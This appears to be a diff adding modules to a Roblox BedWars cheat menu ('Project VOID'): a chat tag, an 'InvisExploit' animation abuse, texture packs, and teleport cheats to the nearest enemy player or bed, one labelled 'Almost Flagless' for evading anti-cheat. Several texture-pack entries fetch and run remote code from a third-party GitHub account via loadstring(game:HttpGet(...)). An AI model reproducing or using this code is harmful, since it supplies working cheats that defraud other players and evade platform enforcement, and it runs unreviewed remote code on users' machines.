+                    if oldface then
+                        oldface.Parent = entityLibrary.character.Head
+                    end
+                end
+            end
+        end
+    })
+end)
+
+runFunction(function()
+    local ChatTag2 = {Enabled = false}
+    ChatTag2 = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+        Name = "ChatTag",
+        Function = function(callback)
+            if callback then
+                local textChatService = game:GetService("TextChatService")
+                textChatService.OnIncomingMessage = function(message)
+                    local properties = Instance.new("TextChatMessageProperties")
+                    if message.TextSource then
+                        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+                        if player and player.UserId == playersService.LocalPlayer.UserId then
+                            properties.PrefixText = "<font color='#2ce698'>[Project VOID User🔥]</font> " .. message.PrefixText
+                        end
+                    end
+                    return properties
+                end
+            end
+        end
+    })
+end)																																																																																																																																																																																																																																																													
+
+runFunction(function()
+	local AnimationPlayer = {Enabled = false}
+	local AnimationPlayerBox = {Value = "10725339583"}
+	local AnimationPlayerSpeed = {Speed = 0}
+	AnimationPlayer.Connections = {}
+	local playedanim
+	InvisExploit = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+		Name = "InvisExploit",
+		Function = function(callback)
+			if callback then 
+				if entityLibrary.isAlive then 
+					if playedanim then 
+						playedanim:Stop() 
+						playedanim.Animation:Destroy()
+						playedanim = nil 
+					end
+					local anim = Instance.new("Animation")
+					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
+					if not suc then
+						id = AnimationPlayerBox.Value
+					end
+					anim.AnimationId = "rbxassetid://"..id
+					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
+					if suc then
+						playedanim.Priority = Enum.AnimationPriority.Action4
+						playedanim.Looped = true
+						playedanim:Play()
+						playedanim:AdjustSpeed(AnimationPlayerSpeed.Speed / 10)
+						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
+							pcall(function()
+								if AnimationPlayer.Enabled then
+									AnimationPlayer.ToggleButton(false)
+									AnimationPlayer.ToggleButton(false)
+								end
+							end)
+						end))
+					else
+						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
+					end
+				end
+				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
+					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
+					task.wait(0.5)
+					if not AnimationPlayer.Enabled then return end
+					if playedanim then 
+						playedanim:Stop() 
+						playedanim.Animation:Destroy()
+						playedanim = nil 
+					end
+					local anim = Instance.new("Animation")
+					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
+					if not suc then
+						id = AnimationPlayerBox.Value
+					end
+					anim.AnimationId = "rbxassetid://"..id
+					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
+					if suc then
+						playedanim.Priority = Enum.AnimationPriority.Action4
+						playedanim.Looped = true
+						playedanim:Play()
+						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
+						playedanim.Stopped:Connect(function()
+							if AnimationPlayer.Enabled then
+								AnimationPlayer.ToggleButton(false)
+								AnimationPlayer.ToggleButton(false)
+							end
+						end)
+					else
+						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
+					end
+				end))
+			else
+				if playedanim then playedanim:Stop() playedanim = nil end
+			end
+		end
+	})
+end)
+
+runFunction(function()
+	local transformed = false
+	local TexturePacks = {["Enabled"] = false}
+	local packselected = {["Value"] = "OldBedwars"}
+
+	local packfunctions = {
+		SeventhPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%237"))()  
+			end)
+		end,
+		EighthPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/1024xPack"))()  
+			end)
+		end,
+		SixthPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%236"))()  
+			end)
+		end,
+		FifthPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%235"))()  
+			end)
+		end,
+		FourthPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%234"))()  
+			end)
+		end,
+		ThirdPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/TexturePack"))()  
+			end)
+		end,
+		SecondPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%232"))()  
+			end)
+		end,
+		FirstPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%231"))()  
+			end)
+		end,
+		EgirlPack = function() 
+			task.spawn(function() 
+				local Players = game:GetService("Players")
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+				local Workspace = game:GetService("Workspace")
+				local objs = game:GetObjects("rbxassetid://14126814481")
+				local import = objs[1]
+				import.Parent = game:GetService("ReplicatedStorage")
+				index = {
+					{
+						name = "wood_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Wood_Sword"),
+					},
+					{
+						name = "stone_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Stone_Sword"),
+					},
+					{
+						name = "iron_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Iron_Sword"),
+					},
+					{
+						name = "diamond_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Diamond_Sword"),
+					},
+					{
+						name = "emerald_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Emerald_Sword"),
+					},
+					{
+						name = "rageblade",
+						offset = CFrame.Angles(math.rad(0),math.rad(-90),math.rad(90)),
+						model = import:WaitForChild("Rageblade"),
+					}, 
+				}
+				local func = Workspace:WaitForChild("Camera").Viewmodel.ChildAdded:Connect(function(tool)
+					if(not tool:IsA("Accessory")) then return end
+					for i,v in pairs(index) do
+						if(v.name == tool.Name) then
+							for i,v in pairs(tool:GetDescendants()) do
+								if(v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation")) then
+									v.Transparency = 1
+								end
+							end
+							local model = v.model:Clone()
+							model.CFrame = tool:WaitForChild("Handle").CFrame * v.offset
+							model.CFrame *= CFrame.Angles(math.rad(0),math.rad(-50),math.rad(0))
+							model.Parent = tool
+							local weld = Instance.new("WeldConstraint",model)
+							weld.Part0 = model
+							weld.Part1 = tool:WaitForChild("Handle")
+							local tool2 = Players.LocalPlayer.Character:WaitForChild(tool.Name)
+							for i,v in pairs(tool2:GetDescendants()) do
+								if(v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation")) then
+									v.Transparency = 1
+								end
+							end
+							local model2 = v.model:Clone()
+							model2.Anchored = false
+							model2.CFrame = tool2:WaitForChild("Handle").CFrame * v.offset
+							model2.CFrame *= CFrame.Angles(math.rad(0),math.rad(-50),math.rad(0))
+							model2.CFrame *= CFrame.new(.6,0,-1)
+							model2.Parent = tool2
+							local weld2 = Instance.new("WeldConstraint",model)
+							weld2.Part0 = model2
+							weld2.Part1 = tool2:WaitForChild("Handle")
+						end
+					end
+				end)			             
+			end)
+		end,
+		GlizzyPack = function() 
+			task.spawn(function()
+				loadstring(game:HttpGet("https://github.com/SnoopyOwner/TexturePacks/blob/main/Glizzy"))()   
+			end)
+		end
+	}
+
+	TexturePacks = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+		["Name"] = "TexturePacks",
+		["Function"] = function(callback) 
+			if callback then 
+				if not transformed then
+					transformed = true
+					packfunctions[packselected["Value"]]()
+				end
+			else
+				CreateNotification("TexturePacks", "Disabled Next Game", 10)
+			end
+		end,
+		["ExtraText"] = function()
+			return packselected["Value"]
+		end
+	})
+	packselected = TexturePacks.CreateDropdown({
+		["Name"] = "Pack",
+		["Function"] = function() end,
+		["List"] = {"GlizzyPack", "FirstPack", "SecondPack", "ThirdPack", "FourthPack", "FifthPack", "SixthPack", "SeventhPack","EighthPack", "EgirlPack"}
+	})
+end)
+
+runFunction(function()
+    local hasTeleported = false
+    local TweenService = game:GetService("TweenService")
+
+    function findNearestPlayer()
+        local nearestPlayer = nil
+        local minDistance = math.huge
+
+        for _,v in pairs(game.Players:GetPlayers()) do
+            if v ~= lplr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Team ~= lplr.Team and v.Character:FindFirstChild("Humanoid").Health > 0 then
+                local distance = (v.Character.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).magnitude
+                if distance < minDistance then
+                    nearestPlayer = v
+                    minDistance = distance
+                end
+            end
+        end
+        return nearestPlayer
+    end
+
+
+    function tweenToNearestPlayer()
+        local nearestPlayer = findNearestPlayer()
+        if nearestPlayer and not hasTeleported then
+            hasTeleported = true
+
+            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+
+            local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = nearestPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)})
+            tween:Play()
+        end
+    end
+
+    PlayerTp = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+        Name = "PlayerTP",
+        Function = function(callback)
+            if callback then
+                lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+                lplr.CharacterAdded:Connect(function()
+                    wait(0.3)
+                    tweenToNearestPlayer()
+                end)
+                hasTeleported = false
+                PlayerTp["ToggleButton"](false)
+            end
+        end,
+        ["HoverText"] = "Teleports you to the closest player that is not on your team (BETA)"
+    })
+end)
+
+runFunction(function()
+	local hasTeleported = false
+	local TweenService = game:GetService("TweenService")
+
+	function findNearestBed()
+		local nearestBed = nil
+		local minDistance = math.huge
+
+		for _,v in pairs(game.Workspace:GetDescendants()) do
+			if v.Name:lower() == "bed" and v:FindFirstChild("Covers") and v:FindFirstChild("Covers").BrickColor ~= lplr.Team.TeamColor then
+				local distance = (v.Position - lplr.Character.HumanoidRootPart.Position).magnitude
+				if distance < minDistance then
+					nearestBed = v
+					minDistance = distance
+				end
+			end
+		end
+		return nearestBed
+	end
+	function tweenToNearestBed()
+		local nearestBed = findNearestBed()
+		if nearestBed and not hasTeleported then
+			hasTeleported = true
+
+			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+
+			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = nearestBed.CFrame + Vector3.new(0, 2, 0)})
+			tween:Play()
+		end
+	end
+	BedTp = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+		Name = "BedTp",
+		Function = function(callback)
+			if callback then
+				lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				lplr.CharacterAdded:Connect(function()
+					wait(0.3) 
+					tweenToNearestBed()
+				end)
+				hasTeleported = false
+				BedTp["ToggleButton"](false)
+			end
+		end,
+		["HoverText"] = "Almost Flagless 🤑"
+	})
+end)
